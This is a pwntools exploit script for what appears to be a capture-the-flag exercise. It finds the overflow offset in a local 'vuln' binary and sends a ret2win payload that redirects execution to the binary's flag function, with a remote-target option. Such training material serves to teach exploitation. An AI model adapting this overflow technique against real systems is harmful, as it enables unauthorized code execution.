from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
def find_ip(payload):
    # Launch process and send payload
    p = process(exe)
    p.sendlineafter(b':', payload)
    # Wait for the process to crash
    p.wait()
    # Print out the address of EIP/RIP at the time of crashing
    ip_offset = cyclic_find(p.corefile.pc)  # x86
    # ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

# How many bytes to the instruction pointer (EIP)?
padding = 188
offset = find_ip(cyclic(200))

payload = flat(
        b'A' * 188,
        elf.functions.flag, # 0x080491e2
        0x0,  # Return pointer - try changing to main() and step through with GDB!
        0xdeadbeef,  # Param_1
        0xc0ded00d,  # Param_2
)

# Save the payload to file
write('payload', payload)

# Send the payload
io.sendlineafter(b':', payload)

# Receive the flag
io.interactive()
